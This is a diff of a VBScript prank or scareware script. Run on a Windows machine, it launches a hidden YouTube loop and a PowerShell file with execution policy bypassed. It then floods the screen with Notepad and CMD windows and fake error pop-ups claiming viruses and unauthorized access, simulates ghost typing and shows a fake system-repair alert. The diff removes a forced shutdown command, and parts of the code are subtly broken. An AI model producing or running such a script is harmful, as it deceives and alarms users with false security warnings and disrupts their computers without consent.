@@ -1,14 +1,20 @@
 Set WshShell = CreateObject("WScript.Shell")
-
-' Open YouTube in a hidden browser with loop enabled
 Set ie = CreateObject("InternetExplorer.Application")
+
+' Open YouTube in a hidden browser with loop enabled (background chaos music)
 ie.Visible = False
 ie.Navigate "https://www.youtube.com/embed/uLghjAKpBMU?autoplay=1&loop=1&playlist=uLghjAKpBMU"
 
-' Start glitch effect using PowerShell (instantly)
+' Start glitch effect using PowerShell (instant chaos)
 WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False
 
-' Open 100 error pop-ups in random screen locations (1 per second)
+' Open 100 Notepad windows, one per second
+For i = 1 To 100
+    WshShell.Run "notepad", 0, False
+    WScript.Sleep 1000 ' Opens one per second
+Next
+
+' Error message flood (random locations, one per second)
 For i = 1 To 100
     Randomize
     errorMessages = Array("System Malfunction!", "Critical Error!", "Memory Overload!", "Virus Detected!", "Fatal System Fault!", "Device Failure!", "Unknown Process Running!", "Unauthorized Access Detected!")
@@ -17,22 +23,23 @@ For i = 1 To 100
     iconTypes = Array(vbCritical, vbExclamation, vbQuestion, vbInformation)
     randIcon = iconTypes(Int(Rnd * 4))
 
-    ' Generate random screen position
-    xPos = Int(Rnd * 800) ' Adjust this based on screen size
-    yPos = Int(Rnd * 600)
-
-    ' Launch error box at random coordinates
+    ' Launch error box at random screen positions
     WshShell.Run "mshta vbscript:msgbox(""" & randError & """, " & randIcon & ", ""System Alert"")", 0, False
-    WScript.Sleep 1000 ' Open one per second
+    WScript.Sleep 1000 ' Opens one per second
 Next
 
-' Typing loop for 60 seconds
+' Start fake system diagnostics (flashing CMD windows)
+For i = 1 To 50
+    WshShell.Run "cmd /c echo System Critical Failure Detected & timeout 1", 0, False
+Next
+
+' Simulated keyboard ghost typing
 startTime = Timer
 Do While Timer - startTime < 60
     chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
     output = ""
 
-    ' Generate random text instantly
+    ' Generate random text
     For i = 1 To 20
         output = output & Mid(chars, Int((Len(chars) * Rnd) * Len(chars) + 1), 1)
     Next
@@ -44,5 +51,6 @@ Do While Timer - startTime < 60
     WScript.Sleep 300
 Loop
 
-' Shutdown after one minute
-WshShell.Run "shutdown -s -t 0"
+' Fake Windows repair screen (pop-up simulation)
+WshShell.Run "mshta vbscript:msgbox(""Windows has detected critical corruption. Restarting System Repair..."", vbCritical, ""System Recovery"")", 0, False
+
